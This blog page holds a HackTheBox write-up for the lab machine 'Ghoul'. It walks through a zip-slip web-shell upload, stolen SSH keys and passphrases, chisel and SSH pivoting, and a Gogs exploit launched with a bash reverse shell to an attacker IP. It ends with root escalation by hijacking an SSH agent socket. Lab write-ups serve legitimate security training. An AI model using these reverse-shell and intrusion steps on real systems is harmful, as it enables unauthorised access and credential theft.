@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 12 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 12</h1>
+          <p class="post-date">Posted <time datetime="2019-07-08">Jul 8, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="ghoul">Ghoul</h1>
+
+<p>Initial Scan: 22 Port for SSH, 2222 Port for SSH(Inaccessible from outside), 80 (Apache), 8080 (Tomcat 7.0.88 + Coyote).</p>
+
+<h2 id="user">User</h2>
+
+<p>Tomcat has a CVE-2017-12617, however, it only works before 7.0.81, so useless.</p>
+
+<p>Access Port 8080, using a weak password as your credentials: <code>admin:admin</code>, After that, you should go through the whole page and click each button you can click to get the information. Here, as you know, a Tomcat means Java Web Application. After you click the right button of the banner, you will see a ZIP upload form.</p>
+
+<p>Check here before continue: <a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></p>
+
+<p>so find a place in <code>/var/www/html</code> (default directory of webroot with Apache), and place your PHP trojan here, <code>zip tstsh.zip ../../../../../../../var/www/html/trjyg7.php</code>, zip will allow this absolute to be put into an archive file. Then upload to the site an access it via port 80 with <code>http://10.10.10.101/trjyg7.php</code>.</p>
+
+<p>In your webshell, download the following files:</p>
+
+<ul>
+<li>/var/backups/backups/*.backup</li>
+<li>/var/www/html/secret.php</li>
+</ul>
+
+<p>The files in first, is SSH Private keys with passphrase. The second file is gonna tell you the passphrase as <code>ILoveTouka</code>.</p>
+
+<p>After this step, you&rsquo;ve already got user access with <code>/home/kaneki/user.txt</code>.</p>
+
+<p>Check the Tomcat config, you&rsquo;ll find a commented credentials: <code>admin:test@aogiri123</code>.</p>
+
+<p>Check the other two private keys, you just get the info that kaneki is the administrator here.</p>
+
+<h2 id="root">Root</h2>
+
+<h3 id="internal-network-scanning">Internal network scanning</h3>
+
+<p>Clone this repo as part of your toolsets: <a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p>
+
+<p>Upload nmap to the box, scan the box <code>Aogori 172.20.0.10(22, 2222 For SSH, 80 For HTTP, 8080 For Tomcat)</code> in a /24, you&rsquo;ll find that you&rsquo;re in a Docker container. Found another machine called <code>kaneki-pc 172.20.0.150+172.18.0.200 (22 For SSH)</code>, then nmap again found <code>172.18.0.2(22 For SSH + 3000 For Gogs)</code>.</p>
+
+<p>Login into kaneki-pc with kaneki_pub using the same private key and passphrase. Inside the home, <code>/home/kaneki_pub/to-do.txt</code> tells you git username <code>AogiriTest</code>, password is the one we just found <code>test@aogiri123</code>, PLEASE KEEP IN MIND: THE USERNAME IS CASE-SENSETIVE HERE!</p>
+
+<h3 id="pivoting-to-gogs">Pivoting to GOGS</h3>
+
+<p>Go here to build a tunnel:  <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
+
+<p><code>./chisel client 10.10.16.118:23033 R:6672:172.18.0.2:3000</code> on <code>kaneki-pc</code>,
+<code>./chisel server -p 23033 --reverse -v</code> on your local machine.</p>
+
+<p>You have this forward chain, access <code>localhost:6672</code>, you should can access gogs with http.</p>
+
+<h4 id="what-if-ssh">What if SSH?</h4>
+
+<p><code>ssh -i kaneki.backup -L 4455:localhost:23011 kaneki@10.10.10.101</code> -&gt; <code>ssh -L 23011:localhost:23111 kaneki_pub@172.20.0.150</code> -&gt; <code>ssh -L 23111:172.18.0.2:3000 kaneki_pub@127.0.0.1</code>  That works perfectly!</p>
+
+<p>So the whole procedure is: <code>10.10.16.118:4455 -&gt; 10.10.10.101:23011 -&gt; 172.20.0.150:23111 -&gt; 172.18.0.2:3000</code></p>
+
+<p>Check here for reference: <a href="https://superuser.com/questions/96489/an-ssh-tunnel-via-multiple-hops">https://superuser.com/questions/96489/an-ssh-tunnel-via-multiple-hops</a></p>
+
+<h3 id="gogs-rce">GOGS RCE</h3>
+
+<p>There&rsquo;s 2 CVE here, 2018-18925(Fixed in 0.11.79), 2018-20303(Fixed in 0.11.86). The installed version is 0.11.66.0916.</p>
+
+<p>Clone this repo: <a href="https://github.com/TheZ3ro/gogsownz">https://github.com/TheZ3ro/gogsownz</a></p>
+
+<p>Run <code>nc -lvp 44044</code> then <code>python3 gogsownz.py http://localhost:4455/ -n i_like_gogits -C &quot;AogiriTest:test@aogiri123&quot; --rce &quot;/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.12.168/44044 0&gt;&amp;1'&quot;</code>, you will get a reverse shell as git user.</p>
+
+<p>Since <code>git</code> shell is <code>/bin/bash</code>, you just need to run LinEnum here. Check the <code>s6-supervise</code> and <code>s6-svscan</code>, you will learn it use <code>gosu</code> to run service on root.</p>
+
+<p>Run a web server on kaneki-pc with webroot <code>~/.ssh</code> then directly <code>wget http://172.18.0.200:8080/authorized_keys</code> then disconnect the reverse shell and change to SSH shell with <code>ssh git@172.18.0.2</code> Then <code>gosu 0:0 /bin/bash</code>, you have the root of the GOGS docker. Download the files in the home, a <code>aogori-chat.7z</code> and <code>session.sh</code>.</p>
+
+<p>Unarchive this 7-zip file, <code>grep -n password ./*</code>, you will find a password. But it&rsquo;s a git repository, and from <code>git log</code> you can see someone may mistakenly commits the high-privileged password. But it is <code>git reset --hard</code> -ed, so <code>git show ORIG_HEAD</code>, you will get a password: <code>7^Grc%C\7xEQ?tb4</code>, use this password to <code>su root</code> on <code>kaneki-pc</code>. It works.</p>
+
+<p>Reference:  <a href="https://stackoverflow.com/questions/964876/head-and-orig-head-in-git">https://stackoverflow.com/questions/964876/head-and-orig-head-in-git</a></p>
+
+<h2 id="get-actual-root">Get actual root</h2>
+
+<p>Reference:  <a href="http://blog.7elements.co.uk/2012/04/ssh-agent-abusing-trust-part-1.html?m=1">http://blog.7elements.co.uk/2012/04/ssh-agent-abusing-trust-part-1.html?m=1</a></p>
+
+<p>On <code>kaneki-pc</code>, after <code>su root</code> you will find <code>/root/root.txt</code> which tells you progress is still not 100% XD. Run <code>pspy64 -f -r /tmp</code> with root permission, and wait for about 5 mins. You will notice a process: <code>ssh -p2222 -t root@172.18.0.1 ./log.sh</code> and with a file created like that <code>/tmp/ssh-blahblah/agent.1234</code>. So save the below as a script file. You only have 50 seconds here each round.</p>
+
+<p>My script attached here:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+SOCKKEY=$1
+SOCKPID=$2
+
+export SSH_AUTH_SOCK=/tmp/ssh-$SOCKKEY/agent.$SOCKPID
+ssh -p2222 root@172.18.0.1
+</code></pre>
+
+<p>Then after you get the notification again, run <code>./runroot.sh blahblah 1234</code>, you will get a SSH connection to physical host of the machine. There&rsquo;s a real <code>/root/root.txt</code>.</p>
+
+<blockquote>
+<p>This process can be automated if you edit your <code>/etc/ssh/ssh_config</code>,
+Works like that:</p>
+</blockquote>
+
+<pre><code>Host *
+  ControlPath /tmp/%r@%h:%p
+  ControlMaster auto
+  ControlPersist Yes
+</code></pre>
+
+<blockquote>
+<p>Then: <code>ssh -O check -S /tmp/root\@172.18.0.1\:2222 %h</code>,
+Then: <code>ssh -S /tmp/root\@172.18.0.1\:2222 %h</code>,
+You will have the session.</p>
+</blockquote>
+
+<p>I personally prefer the scripting way instead of editing config&hellip;</p>
+
+<p>(END)</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup11/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 11</h2>
+    <p class="card-text">HackTheBox 练手</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-07-05 75:00">Jul 5, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
